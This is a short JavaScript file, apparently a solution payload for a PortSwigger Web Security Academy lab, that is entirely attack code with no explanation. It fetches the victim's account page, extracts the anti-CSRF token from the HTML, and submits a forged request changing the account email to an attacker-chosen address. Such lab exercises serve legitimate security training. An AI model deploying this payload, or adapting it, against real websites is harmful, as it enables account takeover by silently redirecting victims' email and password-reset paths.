function change_mail(token) {
    var url = "https://0a4100e90328735b8085852800c300a7.web-security-academy.net/my-account/change-email";
    var params = "email=testexploit%40test.com&csrf=" + token;
    var CSRF = new XMLHttpRequest();
    CSRF.open("POST", url, false);
    CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    CSRF.send(params);
}

function get_token() {
    var XHR = new XMLHttpRequest();
    XHR.onreadystatechange = function () {
        if (XHR.readyState == 4) {
            var htmlSource = XHR.responseText; //page source
            parser = new DOMParser().parseFromString(htmlSource, "text/html");
            token = parser.getElementsByName("csrf")[0].value;
            console.log(token)
            change_mail(token);
        }
    }	
    XHR.open('GET', 'https://0a4100e90328735b8085852800c300a7.web-security-academy.net/my-account', true);
    XHR.send();
}

function run_csrf() {
    get_token();
}

run_csrf();